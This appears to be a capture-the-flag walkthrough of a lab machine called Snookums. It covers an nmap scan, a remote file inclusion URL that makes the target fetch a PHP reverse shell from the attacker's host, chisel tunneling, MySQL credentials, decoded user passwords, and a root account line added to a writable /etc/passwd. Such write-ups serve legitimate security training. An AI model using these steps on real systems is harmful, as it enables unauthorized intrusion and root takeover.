---
icon: ubuntu
---

# Snookums - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.58 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 16:16 EDT
Nmap scan report for 192.168.194.58
Host is up (0.028s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2025-10-05T16:18:38-04:00
|_clock-skew: mean: 1h20m03s, deviation: 2h18m34s, median: 2s
| smb2-time: 
|   date: 2025-10-05T20:18:42
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   25.86 ms 192.168.45.1
2   25.92 ms 192.168.45.254
3   27.42 ms 192.168.251.1
4   27.48 ms 192.168.194.58
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

We get a version right off the bat. A quick google search for an exploit reveals and RCE exploit on [**Github**](https://github.com/beauknowstech/SimplePHPGal-RCE.py)

### <mark style="color:$primary;">**Simple PHP Photo Gallery v0.8 RCE**</mark>

```
git clone https://github.com/beauknowstech/SimplePHPGal-RCE.py.git
```

Taking a look at the exploits code we can attempt to do the exploit manually

<figure><img src="../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

First I created a php reverse shell using pentest monkeys

Checked the open ports and selected 445

<figure><img src="../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

Now to exploit this we will be serving the reverse shell via a simple http server prep a listener then visit the following url.

```
http://192.168.194.58/image.php?img=http://192.168.45.158/reverse.php
```

<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

In the `/var/www/html` directory we found a `db.php` file with some credentials

<figure><img src="../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

I am going to do port forwarding with [**chisel**](https://github.com/jpillora/chisel) to get better access to the mysql database

```
./chisel_1.10.1_linux_amd64 server -p 139 --reverse
```

<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

Used port 139 since it is open on the machine. Now to download chisel on the target machine and execute it!

```
./chisel_1.10.1_linux_amd64 client 192.168.45.158:139 R:3306:127.0.0.1:3306
```

<figure><img src="../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating MySQL DB</mark>

```
mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337
```

<figure><img src="../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

These hashes look base64 encoded

### <mark style="color:$primary;">Cracking Hashes</mark>

<figure><img src="../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

These hashes are double base64 encoded

```
josh:MobilizeHissSeedtime747
michael:HockSydneyCertify123
sabrina:OverallCrestLean000
```

### <mark style="color:$primary;">SSH</mark>

We are able to ssh in as michael!

<figure><img src="../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Linpeas</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>

Linpeas revealed we can write to the `/etc/passwd` file lets add our own root user

### <mark style="color:$primary;">Writable /etc/passwd</mark>

<figure><img src="../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

Using openssl to create a hash for our password deimos123!

<figure><img src="../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Now to modify /etc/passwd and add our new user

```
deimos:$1$BYuHThMg$JJNZMtx2ravYlU8EE9o8l1:0:0:root:/root:/bin/bash
```

<figure><img src="../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

Now we can simply su to become root!

<figure><img src="../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>
